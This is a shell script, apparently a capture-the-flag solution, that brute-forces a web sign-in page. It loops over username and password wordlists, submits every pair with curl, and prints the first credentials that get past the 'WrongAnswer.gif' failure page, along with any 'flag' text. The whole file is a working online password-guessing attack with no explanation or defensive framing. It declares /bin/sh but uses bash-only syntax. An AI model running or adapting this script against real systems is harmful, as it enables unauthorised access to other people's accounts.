#!/bin/sh

if [ $# -lt 1 ]; then
    echo "Usage: $0 ip-address"
    exit 1
fi

username_file='./username/top-usernames-shortlist.txt'
password_file='./password/10-million-password-list-top-1000000.txt'
target_url="http://$1/index.php?page=signin"

while IFS= read -r username; do
	while IFS= read -r password; do
		response=$(curl -s -G --data-urlencode "username=$username" --data-urlencode "password=$password" --data-urlencode "Login=Login" "$target_url")
		if [[ "$response" != *"WrongAnswer.gif"* ]]; then
      echo "username: ==> $username"
      echo "password: ==> $password"
      grep "flag" <<< "$response"
      exit 0
    else
      echo "Login failed for username: $username, password: $password"
    fi
	done < "$password_file"
done < "$username_file"